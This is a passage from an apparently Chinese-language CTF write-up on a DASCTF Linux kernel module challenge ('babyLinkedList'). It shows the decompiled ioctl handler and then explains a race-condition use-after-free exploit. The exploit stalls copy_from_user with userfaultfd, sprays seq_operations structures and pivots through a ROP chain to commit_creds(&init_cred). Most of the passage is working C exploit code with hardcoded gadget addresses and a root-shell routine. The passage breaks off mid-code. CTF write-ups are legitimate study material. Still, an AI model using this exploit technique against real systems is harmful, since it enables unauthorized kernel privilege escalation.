punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cmd <span class="token operator">==</span> <span class="token number">0x7777</span> <span class="token punctuation">)</span>                  <span class="token comment">// get、del</span>  <span class="token punctuation">&#123;</span>    v11 <span class="token operator">=</span> head<span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>head <span class="token punctuation">)</span>      <span class="token keyword">return</span> v9<span class="token punctuation">;</span>    head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>head <span class="token punctuation">)</span>      <span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v11<span class="token operator">-></span>data<span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>v11<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>cmd <span class="token operator">&lt;=</span> <span class="token number">0x7777</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cmd <span class="token operator">==</span> <span class="token number">0x6666</span> <span class="token punctuation">)</span>              <span class="token comment">// set、add</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>req <span class="token operator">></span> <span class="token number">0x40</span> <span class="token punctuation">)</span>                      <span class="token comment">// 传入的req->size不能大于0x40</span>          <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>        LinkedList <span class="token operator">=</span> <span class="token punctuation">(</span>LinkedList <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3264LL</span><span class="token punctuation">,</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        LinkedList<span class="token operator">-></span>size <span class="token operator">=</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span>                 <span class="token comment">// LinkedList->size = req->size</span>        v5 <span class="token operator">=</span> head<span class="token punctuation">;</span>        head <span class="token operator">=</span> LinkedList<span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span>        LinkedList<span class="token operator">-></span>next <span class="token operator">=</span> v5<span class="token punctuation">;</span>                  <span class="token comment">// LinkedList->next = head</span>        v7 <span class="token operator">=</span> <span class="token function">_kmalloc</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">3264LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// LinkedList->data = kmalloc(req->size, 3264)</span>        v8 <span class="token operator">=</span> v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        LinkedList<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v7<span class="token punctuation">;</span>        <span class="token function">copy_from_user</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// copy_from_usr(LinkedList->data, req->data, 8)</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cmd <span class="token operator">==</span> <span class="token number">0x8888</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"\x011[DASCTF:] Sorry i don't want to complete the function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> v9<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cmd <span class="token operator">!=</span> <span class="token number">0x9999</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">babyLinkedList_ioctl_cold</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="二、利用思路"><a href="#二、利用思路" class="headerlink" title="二、利用思路"></a>二、利用思路</h1><p><img src="/EXP_FILE/d4476d7ee634d0c1ad8d11c90bdafca1_MD5.jpeg"></p><p>通过分析，维护的结构体为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">linkedlist</span><span class="token punctuation">&#123;</span><span class="token class-name">uint64_t</span> size<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">linkedlist</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>LinkedList<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们需要传入的结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token class-name">uint64_t</span> size<span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在删除的时候没有任何锁，思考条件竞争，&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;unprivileged_userfaultfd&#x3D;1，允许uaserfaultfd系统调用</p><p>使用userfaultfd把程序卡在copy_from_user，再释放链表节点，由于只能写首8字节，我选择喷射seq_operations结构体改start指针，再滑到pt_regs的ropchain上。</p><h1 id="三、EXP"><a href="#三、EXP" class="headerlink" title="三、EXP"></a>三、EXP</h1><p>经过调试，距离pt_regs为0x130字节，我选择了下面的gagdet：</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0xffffffff8188fba1: add rsp, 0x130; pop rbx; pop r12; pop rbp; ret;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>且由于gadget的限制，我们只能找到适合commit_cred(&amp;init_cred)的rop链。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/userfaultfd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0x6666</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0x7777</span></span></span><span class="token class-name">size_t</span> POP_RDI_RET <span class="token operator">=</span> <span class="token number">0xffffffff81086aa0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> POP_RDX_RET <span class="token operator">=</span> <span class="token number">0xffffffff8153d116</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ADD_RSP_0x130_PPP_RET <span class="token operator">=</span> <span class="token number">0xffffffff8188fba1</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0xffffffff810c40b0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff810c3d30</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode <span class="token operator">=</span> <span class="token number">0xffffffff81c00a34</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> init_cred <span class="token operator">=</span> <span class="token number">0xffffffff82a5fa40</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/* to run the exp on the specific core only */</span><span class="token keyword">void</span> <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set cpu affinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">pthread_t</span> monitor_thread<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">registerUserFaultFd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> len<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>handler<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token comment">/* Create and enable userfaultfd object */</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_API"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>monitor_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> handler<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> uffd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> seqfd<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> size<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token punctuation">;</span>req<span class="token punctuation">.</span>data<span class="token operator">=</span>data<span class="token punctuation">;</span><span class="token keyword">int</span> r<span class="token operator">=</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_ADD<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>data<span class="token operator">=</span>data<span class="token punctuation">;</span><span class="token keyword">int</span> r<span class="token operator">=</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_DEL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>copy_page <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>copy_page <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">long</span> copy_size <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> uffdio_copy<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> arg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>    <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fault_handler_thread waiting for page fault..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR <span class="token operator">||</span> pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLHUP<span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"revents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"read msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">!=</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Unexpected event on userfaultfd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[t][*] fault_handler_thread(): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"POLLIN = %d; POLLERR = %d\n"</span><span class="token punctuation">,</span>                 <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLIN<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[t][*] UFFD_EVENT_PAGEFAULT event: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flags = %llx; "</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"address = %llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//your code...</span><span class="token keyword">switch</span><span class="token punctuation">(</span>fault_cnt<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[t][*] UAF write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">del</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"spray"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>seqfd<span class="token operator">=</span>spray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>        uffdio_copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> 